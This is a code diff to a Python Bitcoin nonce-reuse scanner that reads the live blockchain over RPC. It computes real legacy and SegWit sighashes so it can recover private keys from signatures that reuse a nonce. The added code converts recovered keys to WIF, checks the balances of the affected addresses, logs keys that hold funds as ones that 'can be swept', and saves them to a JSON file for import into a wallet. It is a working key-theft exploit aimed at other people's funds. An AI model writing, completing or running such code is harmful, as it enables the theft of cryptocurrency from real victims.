@@ -28,6 +28,8 @@ from typing import Dict, List, Tuple, Optional, Set
 from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
 import hashlib
 import binascii
+import base58
+import struct
 
 # Configure decimal context to handle Bitcoin's precision
 ctx = getcontext()
@@ -54,6 +56,339 @@ json.loads = _patched_loads
 
 # Secp256k1 curve parameters
 CURVE_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+
+# SIGHASH types
+SIGHASH_ALL = 0x01
+SIGHASH_NONE = 0x02
+SIGHASH_SINGLE = 0x03
+SIGHASH_ANYONECANPAY = 0x80
+
+
+def serialize_varint(n: int) -> bytes:
+    """Serialize an integer as a Bitcoin variable-length integer."""
+    if n < 0xfd:
+        return struct.pack('<B', n)
+    elif n <= 0xffff:
+        return b'\xfd' + struct.pack('<H', n)
+    elif n <= 0xffffffff:
+        return b'\xfe' + struct.pack('<I', n)
+    else:
+        return b'\xff' + struct.pack('<Q', n)
+
+
+def serialize_script(script_hex: str) -> bytes:
+    """Serialize a script with its length prefix."""
+    script_bytes = bytes.fromhex(script_hex)
+    return serialize_varint(len(script_bytes)) + script_bytes
+
+
+def serialize_outpoint(txid: str, vout: int) -> bytes:
+    """Serialize a transaction outpoint (previous tx reference)."""
+    # Reverse the txid (Bitcoin uses little-endian for hashes)
+    txid_bytes = bytes.fromhex(txid)[::-1]
+    vout_bytes = struct.pack('<I', vout)
+    return txid_bytes + vout_bytes
+
+
+def calculate_sighash_segwit(tx: dict, input_idx: int, script_code: str,
+                            value: int, sighash_type: int) -> int:
+    """
+    Calculate sighash for SegWit transaction (BIP143).
+    
+    Args:
+        tx: Full transaction dictionary
+        input_idx: Index of input being signed
+        script_code: Script code (for P2WPKH, this is the P2PKH equivalent)
+        value: Value of the output being spent (in satoshis)
+        sighash_type: SIGHASH type byte
+    
+    Returns:
+        Sighash as integer
+    """
+    base_sighash = sighash_type & 0x1f
+    anyonecanpay = sighash_type & SIGHASH_ANYONECANPAY
+    
+    # Start building the preimage
+    preimage = b''
+    
+    # 1. nVersion (4 bytes)
+    preimage += struct.pack('<I', tx.get('version', 1))
+    
+    # 2. hashPrevouts (32 bytes)
+    if not anyonecanpay:
+        prevouts = b''
+        for inp in tx['vin']:
+            if 'coinbase' not in inp:
+                prevouts += serialize_outpoint(inp['txid'], inp['vout'])
+        hashPrevouts = hashlib.sha256(hashlib.sha256(prevouts).digest()).digest()
+    else:
+        hashPrevouts = b'\x00' * 32
+    preimage += hashPrevouts
+    
+    # 3. hashSequence (32 bytes)
+    if not anyonecanpay and base_sighash != SIGHASH_SINGLE and base_sighash != SIGHASH_NONE:
+        sequences = b''
+        for inp in tx['vin']:
+            if 'coinbase' not in inp:
+                sequences += struct.pack('<I', inp.get('sequence', 0xffffffff))
+        hashSequence = hashlib.sha256(hashlib.sha256(sequences).digest()).digest()
+    else:
+        hashSequence = b'\x00' * 32
+    preimage += hashSequence
+    
+    # 4. outpoint (32 + 4 bytes)
+    tx_input = tx['vin'][input_idx]
+    preimage += serialize_outpoint(tx_input['txid'], tx_input['vout'])
+    
+    # 5. scriptCode
+    preimage += serialize_script(script_code)
+    
+    # 6. value (8 bytes)
+    preimage += struct.pack('<Q', value)
+    
+    # 7. nSequence (4 bytes)
+    preimage += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
+    
+    # 8. hashOutputs (32 bytes)
+    if base_sighash != SIGHASH_SINGLE and base_sighash != SIGHASH_NONE:
+        outputs = b''
+        for output in tx['vout']:
+            value_satoshis = int(float(output['value']) * 100000000)
+            outputs += struct.pack('<Q', value_satoshis)
+            outputs += serialize_script(output['scriptPubKey']['hex'])
+        hashOutputs = hashlib.sha256(hashlib.sha256(outputs).digest()).digest()
+    elif base_sighash == SIGHASH_SINGLE and input_idx < len(tx['vout']):
+        output = tx['vout'][input_idx]
+        value_satoshis = int(float(output['value']) * 100000000)
+        output_bytes = struct.pack('<Q', value_satoshis)
+        output_bytes += serialize_script(output['scriptPubKey']['hex'])
+        hashOutputs = hashlib.sha256(hashlib.sha256(output_bytes).digest()).digest()
+    else:
+        hashOutputs = b'\x00' * 32
+    preimage += hashOutputs
+    
+    # 9. nLocktime (4 bytes)
+    preimage += struct.pack('<I', tx.get('locktime', 0))
+    
+    # 10. sighash type (4 bytes)
+    preimage += struct.pack('<I', sighash_type)
+    
+    # Double SHA256
+    hash_result = hashlib.sha256(hashlib.sha256(preimage).digest()).digest()
+    
+    return int.from_bytes(hash_result, byteorder='big')
+
+
+def calculate_sighash_legacy(tx: dict, input_idx: int, script_code: str, 
+                             sighash_type: int) -> int:
+    """
+    Calculate the sighash for a legacy (non-SegWit) transaction.
+    
+    Args:
+        tx: Full transaction dictionary from RPC
+        input_idx: Index of the input being signed
+        script_code: Script to use for this input (usually previous output's scriptPubKey)
+        sighash_type: The SIGHASH type byte
+    
+    Returns:
+        The sighash as an integer
+    """
+    # Start with version
+    serialized = struct.pack('<I', tx.get('version', 1))
+    
+    # Serialize inputs
+    base_sighash = sighash_type & 0x1f
+    anyonecanpay = sighash_type & SIGHASH_ANYONECANPAY
+    
+    if anyonecanpay:
+        # Only serialize the input being signed
+        serialized += serialize_varint(1)
+        tx_input = tx['vin'][input_idx]
+        serialized += serialize_outpoint(tx_input['txid'], tx_input['vout'])
+        serialized += serialize_script(script_code)
+        serialized += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
+    else:
+        # Serialize all inputs
+        serialized += serialize_varint(len(tx['vin']))
+        for i, tx_input in enumerate(tx['vin']):
+            if 'coinbase' in tx_input:
+                # Skip coinbase inputs
+                continue
+                
+            serialized += serialize_outpoint(tx_input['txid'], tx_input['vout'])
+            
+            if i == input_idx:
+                # This is the input being signed - use the script_code
+                serialized += serialize_script(script_code)
+            else:
+                # Other inputs - use empty script
+                serialized += serialize_varint(0)
+            
+            # Sequence
+            if base_sighash == SIGHASH_NONE or base_sighash == SIGHASH_SINGLE:
+                if i != input_idx:
+                    serialized += struct.pack('<I', 0)
+                else:
+                    serialized += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
+            else:
+                serialized += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
+    
+    # Serialize outputs
+    if base_sighash == SIGHASH_NONE:
+        # No outputs
+        serialized += serialize_varint(0)
+    elif base_sighash == SIGHASH_SINGLE:
+        # Only output at same index as input
+        if input_idx >= len(tx['vout']):
+            # Bug case: return the error value
+            return 1
+        
+        serialized += serialize_varint(input_idx + 1)
+        
+        # Null outputs before the one we care about
+        for i in range(input_idx):
+            serialized += struct.pack('<q', -1)  # -1 as signed 64-bit = 0xffffffffffffffff
+            serialized += serialize_varint(0)
+        
+        # The actual output
+        output = tx['vout'][input_idx]
+        value_satoshis = int(float(output['value']) * 100000000)
+        serialized += struct.pack('<Q', value_satoshis)
+        serialized += serialize_script(output['scriptPubKey']['hex'])
+        
+    else:  # SIGHASH_ALL
+        # All outputs
+        serialized += serialize_varint(len(tx['vout']))
+        for output in tx['vout']:
+            value_satoshis = int(float(output['value']) * 100000000)
+            serialized += struct.pack('<Q', value_satoshis)
+            serialized += serialize_script(output['scriptPubKey']['hex'])
+    
+    # Locktime
+    serialized += struct.pack('<I', tx.get('locktime', 0))
+    
+    # Sighash type (4 bytes)
+    serialized += struct.pack('<I', sighash_type)
+    
+    # Double SHA256
+    hash_result = hashlib.sha256(hashlib.sha256(serialized).digest()).digest()
+    
+    return int.from_bytes(hash_result, byteorder='big')
+
+
+def private_key_to_wif(private_key: int, compressed: bool = True, testnet: bool = False) -> str:
+    """
+    Convert a private key integer to WIF (Wallet Import Format).
+    
+    Args:
+        private_key: Private key as integer
+        compressed: Whether to use compressed format (default True)
+        testnet: Whether this is for testnet (default False - mainnet)
+    
+    Returns:
+        WIF-encoded private key string
+    """
+    # Convert private key to 32 bytes
+    private_key_bytes = private_key.to_bytes(32, byteorder='big')
+    
+    # Add version byte (0x80 for mainnet, 0xef for testnet)
+    version_byte = b'\xef' if testnet else b'\x80'
+    extended_key = version_byte + private_key_bytes
+    
+    # Add compression flag if compressed
+    if compressed:
+        extended_key += b'\x01'
+    
+    # Calculate checksum (double SHA256)
+    checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
+    
+    # Append checksum
+    final_key = extended_key + checksum
+    
+    # Encode in Base58
+    wif = base58.b58encode(final_key).decode('ascii')
+    
+    return wif
+
+
+def public_key_to_address(public_key_hex: str, testnet: bool = False) -> str:
+    """
+    Convert a public key to a Bitcoin address (P2PKH).
+    
+    Args:
+        public_key_hex: Public key as hex string
+        testnet: Whether this is for testnet (default False - mainnet)
+    
+    Returns:
+        Bitcoin address string
+    """
+    try:
+        public_key_bytes = bytes.fromhex(public_key_hex)
+        
+        # SHA256 hash
+        sha256_hash = hashlib.sha256(public_key_bytes).digest()
+        
+        # RIPEMD160 hash
+        ripemd160 = hashlib.new('ripemd160')
+        ripemd160.update(sha256_hash)
+        pubkey_hash = ripemd160.digest()
+        
+        # Add version byte (0x00 for mainnet, 0x6f for testnet)
+        version_byte = b'\x6f' if testnet else b'\x00'
+        versioned_hash = version_byte + pubkey_hash
+        
+        # Calculate checksum
+        checksum = hashlib.sha256(hashlib.sha256(versioned_hash).digest()).digest()[:4]
+        
+        # Append checksum
+        address_bytes = versioned_hash + checksum
+        
+        # Encode in Base58
+        address = base58.b58encode(address_bytes).decode('ascii')
+        
+        return address
+        
+    except Exception as e:
+        logging.error(f"Error converting public key to address: {e}")
+        return None
+
+
+def private_key_to_public_key(private_key: int) -> Optional[str]:
+    """
+    Derive public key from private key using secp256k1.
+    
+    Args:
+        private_key: Private key as integer
+    
+    Returns:
+        Public key as hex string (compressed format), or None on error
+    """
+    try:
+        from ecdsa import SigningKey, SECP256k1
+        
+        # Convert private key to bytes
+        private_key_bytes = private_key.to_bytes(32, byteorder='big')
+        
+        # Create signing key
+        sk = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
+        
+        # Get verifying (public) key
+        vk = sk.get_verifying_key()
+        
+        # Get compressed public key
+        public_key_bytes = vk.to_string()
+        x = int.from_bytes(public_key_bytes[:32], byteorder='big')
+        y = int.from_bytes(public_key_bytes[32:], byteorder='big')
+        
+        # Compressed format: 0x02 if y is even, 0x03 if y is odd, followed by x
+        prefix = b'\x02' if y % 2 == 0 else b'\x03'
+        compressed_pubkey = prefix + x.to_bytes(32, byteorder='big')
+        
+        return compressed_pubkey.hex()
+        
+    except Exception as e:
+        logging.error(f"Error deriving public key: {e}")
+        return None
 
 
 class SignatureInfo:
@@ -101,6 +436,9 @@ class BitcoinNonceScanner:
         
         # Track unique r values we've seen
         self.seen_r_values: Set[int] = set()
+        
+        # Cache for fetched transactions
+        self.tx_cache: Dict[str, dict] = {}
         
         # Test connection
         try:
@@ -174,6 +512,27 @@ class BitcoinNonceScanner:
         for tx in block['tx'][1:]:
             self._process_transaction(tx, height)
     
+    def _get_transaction(self, txid: str) -> Optional[dict]:
+        """
+        Fetch a transaction from the blockchain (with caching).
+        
+        Args:
+            txid: Transaction ID
+            
+        Returns:
+            Transaction dict or None
+        """
+        if txid in self.tx_cache:
+            return self.tx_cache[txid]
+        
+        try:
+            tx = self.rpc.getrawtransaction(txid, True)
+            self.tx_cache[txid] = tx
+            return tx
+        except Exception as e:
+            logging.debug(f"Failed to fetch transaction {txid}: {e}")
+            return None
+    
     def _process_transaction(self, tx: dict, block_height: int):
         """Extract and analyze signatures from a transaction."""
         txid = tx['txid']
@@ -184,7 +543,7 @@ class BitcoinNonceScanner:
                 continue
             
             # Extract signature from scriptSig
-            sig_info = self._extract_signature(tx_input, txid, input_idx)
+            sig_info = self._extract_signature(tx, tx_input, input_idx)
             
             if sig_info is None:
                 continue
@@ -202,55 +561,128 @@ class BitcoinNonceScanner:
             self.signatures_by_r[sig_info.r].append(sig_info)
             self.seen_r_values.add(sig_info.r)
     
-    def _extract_signature(self, tx_input: dict, txid: str, input_idx: int) -> Optional[SignatureInfo]:
+    def _extract_signature(self, tx: dict, tx_input: dict, input_idx: int) -> Optional[SignatureInfo]:
         """
-        Extract ECDSA signature components from transaction input.
+        Extract ECDSA signature components from transaction input and calculate real sighash.
+        
+        Args:
+            tx: Full transaction dict
+            tx_input: Specific input dict
+            input_idx: Index of this input
         
         Returns:
             SignatureInfo object or None if extraction fails
         """
+        # Check for witness data (SegWit)
+        witness = tx_input.get('txinwitness', [])
+        is_segwit = len(witness) > 0
+        
         script_sig_hex = tx_input.get('scriptSig', {}).get('hex', '')
-        if not script_sig_hex:
-            # Try witness data for SegWit transactions
-            witness = tx_input.get('txinwitness', [])
-            if not witness:
-                return None
-            script_sig_hex = ''.join(witness)
         
         try:
-            script_bytes = bytes.fromhex(script_sig_hex)
+            # Get the previous output
+            prev_txid = tx_input['txid']
+            prev_vout = tx_input['vout']
             
-            # Parse DER-encoded signature
-            r, s, sig_end = self._parse_der_signature(script_bytes)
-            if r is None or s is None:
+            prev_tx = self._get_transaction(prev_txid)
+            if prev_tx is None:
+                logging.debug(f"Could not fetch previous tx {prev_txid}")
                 return None
             
-            # Extract public key (usually after signature)
-            pubkey = self._extract_pubkey(script_bytes, sig_end)
-            if pubkey is None:
+            if prev_vout >= len(prev_tx['vout']):
                 return None
             
-            # Calculate message hash (sighash)
-            # For now, we'll use a placeholder - full implementation would reconstruct
-            # the actual sighash, but for detecting reuse, we just need r/s values
-            z = self._calculate_sighash_placeholder(tx_input)
+            prev_output = prev_tx['vout'][prev_vout]
+            script_pubkey = prev_output['scriptPubKey']['hex']
+            script_pubkey_type = prev_output['scriptPubKey'].get('type', '')
+            value_btc = prev_output['value']
+            value_satoshis = int(float(value_btc) * 100000000)
             
-            return SignatureInfo(r, s, z, txid, input_idx, pubkey)
+            # Parse based on type
+            if is_segwit and len(witness) >= 2:
+                # SegWit transaction
+                # For P2WPKH: witness = [signature, pubkey]
+                # For P2WSH: witness = [signature, ..., redeemScript]
+                
+                sig_hex = witness[0]
+                sig_bytes = bytes.fromhex(sig_hex)
+                
+                # Parse signature
+                r, s, sig_end, sighash_type = self._parse_der_signature(sig_bytes)
+                if r is None or s is None:
+                    return None
+                
+                # Get public key
+                if script_pubkey_type == 'witness_v0_keyhash':
+                    # P2WPKH - pubkey is second witness element
+                    pubkey = witness[1]
+                else:
+                    # P2WSH or other - try to extract pubkey
+                    pubkey = witness[1] if len(witness) > 1 else None
+                
+                if not pubkey:
+                    return None
+                
+                # Calculate script code for P2WPKH
+                # For P2WPKH, script_code is: OP_DUP OP_HASH160 <pubkey_hash> OP_EQUALVERIFY OP_CHECKSIG
+                if script_pubkey_type == 'witness_v0_keyhash':
+                    # Extract the pubkey hash from scriptPubKey
+                    # P2WPKH scriptPubKey: OP_0 <20-byte-hash>
+                    script_pubkey_bytes = bytes.fromhex(script_pubkey)
+                    if len(script_pubkey_bytes) == 22 and script_pubkey_bytes[0] == 0x00:
+                        pubkey_hash = script_pubkey_bytes[2:22]
+                        # Construct P2PKH equivalent script
+                        script_code = '76a914' + pubkey_hash.hex() + '88ac'
+                    else:
+                        logging.debug(f"Unexpected P2WPKH scriptPubKey format")
+                        return None
+                else:
+                    # P2WSH or unknown - use witness script
+                    script_code = witness[-1] if len(witness) > 2 else script_pubkey
+                
+                # Calculate BIP143 sighash
+                z = calculate_sighash_segwit(tx, input_idx, script_code, value_satoshis, sighash_type)
+                
+            else:
+                # Legacy transaction
+                if not script_sig_hex:
+                    return None
+                
+                script_bytes = bytes.fromhex(script_sig_hex)
+                
+                # Parse DER-encoded signature
+                r, s, sig_end, sighash_type = self._parse_der_signature(script_bytes)
+                if r is None or s is None:
+                    return None
+                
+                # Extract public key (usually after signature)
+                pubkey = self._extract_pubkey(script_bytes, sig_end)
+                if pubkey is None:
+                    return None
+                
+                # Legacy sighash
+                z = calculate_sighash_legacy(tx, input_idx, script_pubkey, sighash_type)
+            
+            # Derive address from previous output
+            address = prev_output['scriptPubKey'].get('address') or prev_output['scriptPubKey'].get('addresses', [None])[0]
+            
+            return SignatureInfo(r, s, z, tx['txid'], input_idx, pubkey, address)
             
         except Exception as e:
-            # Silently skip unparseable signatures
+            # Log for debugging but don't crash
+            logging.debug(f"Error extracting signature from {tx.get('txid', 'unknown')}: {e}")
             return None
     
-    def _parse_der_signature(self, script_bytes: bytes) -> Tuple[Optional[int], Optional[int], int]:
+    def _parse_der_signature(self, script_bytes: bytes) -> Tuple[Optional[int], Optional[int], int, int]:
         """
         Parse DER-encoded ECDSA signature.
         
         Returns:
-            Tuple of (r, s, end_position) or (None, None, 0) on failure
+            Tuple of (r, s, end_position, sighash_type) or (None, None, 0, 0) on failure
         """
         try:
             if len(script_bytes) < 8:
-                return None, None, 0
+                return None, None, 0, 0
             
             pos = 0
             
@@ -261,9 +693,9 @@ class BitcoinNonceScanner:
             else:
                 pos = 1
             
-            # DER signature format: 0x30 [total-length] 0x02 [R-length] [R] 0x02 [S-length] [S]
+            # DER signature format: 0x30 [total-length] 0x02 [R-length] [R] 0x02 [S-length] [S] [sighash]
             if script_bytes[pos] != 0x30:
-                return None, None, 0
+                return None, None, 0, 0
             
             pos += 1
             sig_length = script_bytes[pos]
@@ -271,7 +703,7 @@ class BitcoinNonceScanner:
             
             # Parse R
             if script_bytes[pos] != 0x02:
-                return None, None, 0
+                return None, None, 0, 0
             pos += 1
             
             r_length = script_bytes[pos]
@@ -282,7 +714,7 @@ class BitcoinNonceScanner:
             
             # Parse S
             if script_bytes[pos] != 0x02:
-                return None, None, 0
+                return None, None, 0, 0
             pos += 1
             
             s_length = script_bytes[pos]
@@ -291,13 +723,14 @@ class BitcoinNonceScanner:
             s = int.from_bytes(script_bytes[pos:pos + s_length], byteorder='big')
             pos += s_length
             
-            # Skip sighash byte
+            # Get sighash byte
+            sighash_type = script_bytes[pos] if pos < len(script_bytes) else SIGHASH_ALL
             pos += 1
             
-            return r, s, pos
+            return r, s, pos, sighash_type
             
         except (IndexError, ValueError):
-            return None, None, 0
+            return None, None, 0, 0
     
     def _extract_pubkey(self, script_bytes: bytes, offset: int) -> Optional[str]:
         """Extract public key from script."""
@@ -318,21 +751,6 @@ class BitcoinNonceScanner:
         except (IndexError, ValueError):
             return None
     
-    def _calculate_sighash_placeholder(self, tx_input: dict) -> int:
-        """
-        Placeholder for sighash calculation.
-        Full implementation would reconstruct the transaction and calculate proper sighash.
-        For detecting nonce reuse, we need the actual z values to recover the key.
-        """
-        # This is a simplified placeholder - real implementation needs full transaction data
-        txid = tx_input.get('txid', '')
-        vout = tx_input.get('vout', 0)
-        
-        # Create a deterministic hash from available data
-        data = f"{txid}{vout}".encode()
-        hash_bytes = hashlib.sha256(hashlib.sha256(data).digest()).digest()
-        
-        return int.from_bytes(hash_bytes, byteorder='big')
     
     def _attempt_key_recovery(self, new_sig: SignatureInfo):
         """
@@ -359,11 +777,20 @@ class BitcoinNonceScanner:
                 logging.critical(f"   Signature 1: TX {prev_sig.txid}, Input {prev_sig.input_idx}")
                 logging.critical(f"   Signature 2: TX {new_sig.txid}, Input {new_sig.input_idx}")
                 
-                # Store recovered key
-                self.recovered_keys.append((private_key, new_sig.pubkey, [prev_sig, new_sig]))
+                # Store recovered key with additional info
+                wif_key = private_key_to_wif(private_key, compressed=True)
+                address = public_key_to_address(new_sig.pubkey) if new_sig.pubkey else None
+                
+                self.recovered_keys.append({
+                    'private_key': private_key,
+                    'private_key_wif': wif_key,
+                    'public_key': new_sig.pubkey,
+                    'address': address,
+                    'signatures': [prev_sig, new_sig]
+                })
                 
                 # Check balance
-                self._check_balance(private_key, new_sig.pubkey)
+                self._check_balance(address, private_key, wif_key)
                 
                 return
     
@@ -436,18 +863,39 @@ class BitcoinNonceScanner:
         
         return gcd, x, y
     
-    def _check_balance(self, private_key: int, pubkey: str):
+    def _check_balance(self, address: str, private_key: int, wif_key: str):
         """Check if the recovered private key controls any funds."""
         try:
-            # Derive address from public key (simplified - would need full implementation)
-            logging.info(f"   Checking for funds controlled by this key...")
+            if not address:
+                logging.info(f"   Cannot check balance: address derivation failed")
+                return
             
-            # In a full implementation, you would:
-            # 1. Derive the address from the private key
-            # 2. Query the blockchain for UTXO balance
-            # 3. Report any funds found
+            logging.info(f"   Checking balance for address: {address}")
             
-            logging.info(f"   (Balance checking requires additional implementation)")
+            # Try to get balance using Bitcoin Core's scantxoutset
+            # This requires Bitcoin Core 0.17.0+
+            try:
+                result = self.rpc.scantxoutset("start", [f"addr({address})"])
+                
+                if result and 'total_amount' in result:
+                    total_btc = float(result['total_amount'])
+                    
+                    if total_btc > 0:
+                        logging.critical(f"   💰💰💰 FUNDS FOUND! 💰💰💰")
+                        logging.critical(f"   Balance: {total_btc} BTC")
+                        logging.critical(f"   Address: {address}")
+                        logging.critical(f"   Private Key (WIF): {wif_key}")
+                        logging.critical(f"   ⚠️  These funds are vulnerable and can be swept!")
+                    else:
+                        logging.info(f"   Balance: 0 BTC (no funds)")
+                else:
+                    logging.info(f"   Balance: 0 BTC (no UTXOs found)")
+                    
+            except Exception as e:
+                # Fallback: Try listunspent if address is imported
+                logging.debug(f"scantxoutset failed: {e}")
+                logging.info(f"   Balance check unavailable (requires Bitcoin Core 0.17+)")
+                logging.info(f"   Check manually: https://blockstream.info/address/{address}")
             
         except Exception as e:
             logging.error(f"Error checking balance: {e}")
@@ -458,11 +906,22 @@ class BitcoinNonceScanner:
         logging.info("RECOVERED PRIVATE KEYS REPORT")
         logging.info("=" * 80)
         
-        for idx, (privkey, pubkey, sigs) in enumerate(self.recovered_keys, 1):
+        for idx, key_info in enumerate(self.recovered_keys, 1):
+            privkey = key_info['private_key']
+            wif_key = key_info['private_key_wif']
+            pubkey = key_info['public_key']
+            address = key_info['address']
+            sigs = key_info['signatures']
+            
             logging.info(f"\n[{idx}] Private Key Recovered:")
             logging.info(f"    Private Key (hex): {hex(privkey)}")
-            logging.info(f"    Private Key (WIF): [Requires additional implementation]")
+            logging.info(f"    Private Key (WIF): {wif_key}")
             logging.info(f"    Public Key: {pubkey}")
+            
+            if address:
+                logging.info(f"    Bitcoin Address: {address}")
+                logging.info(f"    Check balance: https://blockstream.info/address/{address}")
+            
             logging.info(f"    Reused in {len(sigs)} signatures:")
             
             for sig in sigs:
@@ -474,6 +933,44 @@ class BitcoinNonceScanner:
         logging.info("⚠️  WARNING: These private keys were vulnerable due to nonce reuse.")
         logging.info("    Any funds controlled by these keys are at risk of theft!")
         logging.info("=" * 80)
+        
+        # Save to file for easy access
+        self._save_recovered_keys()
+    
+    def _save_recovered_keys(self):
+        """Save recovered keys to a JSON file."""
+        if not self.recovered_keys:
+            return
+        
+        try:
+            output_file = Path("recovered_keys.json")
+            
+            # Convert to serializable format
+            output_data = []
+            for key_info in self.recovered_keys:
+                output_data.append({
+                    'private_key_hex': hex(key_info['private_key']),
+                    'private_key_wif': key_info['private_key_wif'],
+                    'public_key': key_info['public_key'],
+                    'address': key_info['address'],
+                    'transactions': [
+                        {
+                            'txid': sig.txid,
+                            'input_idx': sig.input_idx,
+                            'explorer_url': f"https://blockstream.info/tx/{sig.txid}"
+                        }
+                        for sig in key_info['signatures']
+                    ]
+                })
+            
+            with open(output_file, 'w') as f:
+                json.dump(output_data, f, indent=2)
+            
+            logging.info(f"\n📁 Recovered keys saved to: {output_file.absolute()}")
+            logging.info(f"   You can import these keys into a Bitcoin wallet using the WIF format.")
+            
+        except Exception as e:
+            logging.error(f"Error saving recovered keys: {e}")
 
 
 def find_bitcoin_cookie(bitcoin_dir: Optional[Path] = None) -> Path:
